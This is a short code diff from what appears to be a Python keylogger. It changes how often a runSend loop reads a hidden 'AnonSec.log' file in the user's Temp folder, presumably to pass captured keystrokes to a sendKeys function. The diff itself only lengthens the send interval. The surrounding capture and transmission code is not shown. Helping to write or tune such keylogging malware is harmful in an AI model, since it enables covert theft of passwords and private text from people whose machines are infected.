@@ -47,7 +47,7 @@ def sendKeys(datah):
 def runSend():
     import time,os
     while True:
-        time.sleep(60)
+        time.sleep(300)
         with open("C:\\Users\\"+str(os.getlogin())+"\\AppData\\Local\\Temp\\AnonSec.log","r+") as fh:
             datah=fh.readline()
             if datah:
